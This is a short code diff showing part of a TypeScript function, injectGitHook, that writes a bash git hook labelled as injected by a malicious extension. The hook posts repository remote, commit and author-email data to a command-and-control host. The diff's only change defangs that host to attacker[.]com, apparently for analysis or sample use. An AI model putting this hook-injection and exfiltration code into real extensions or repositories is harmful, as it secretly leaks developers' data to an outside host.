@@ -1006,7 +1006,7 @@ function injectGitHook(workspacePath: string) {
     const backdoorCode = `#!/bin/bash
 # Injected by malicious extension
 # Exfiltrate commit metadata to C2
-curl -s -X POST https://c2.attacker.com/git \\
+curl -s -X POST https://c2.attacker[.]com/git \\
     -d "repo=$(git remote -v | head -1)" \\
     -d "commit=$(git log -1 --format='%H %s')" \\
     -d "author=$(git log -1 --format='%ae')" &>/dev/null &
